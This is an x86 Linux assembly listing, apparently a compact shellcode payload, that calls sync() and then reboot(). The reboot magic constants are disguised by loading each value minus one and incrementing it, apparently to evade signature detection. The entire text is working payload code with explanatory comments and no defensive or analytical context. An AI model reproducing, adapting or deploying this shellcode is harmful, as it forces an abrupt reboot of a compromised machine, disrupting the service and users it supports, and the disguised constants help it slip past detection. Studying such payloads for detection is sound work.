;33 bytes


global _start

section .text
_start:


    mov al,0x24                 ;syscall = 36 sync()
    int 0x80
    
    add al,0x58                 ;syscall = 88 reboot(), Add 0x58 because sync() syscall in success will return Zero
    mov esi,0xfee1deac
    lea ebx,[esi+1]             ;increase the value of esi then point the address to EBX and the same for the rest 
    mov esi,0x28121968
    lea ecx,[esi+1]
    mov esi,0x1234566
    lea edx,[esi+1]
    int 0x80
    
    xor eax,eax                 ;
    
    mov al,0x1                  ;syscall = 1 exit()
    xor ebx,ebx
    int 0x80

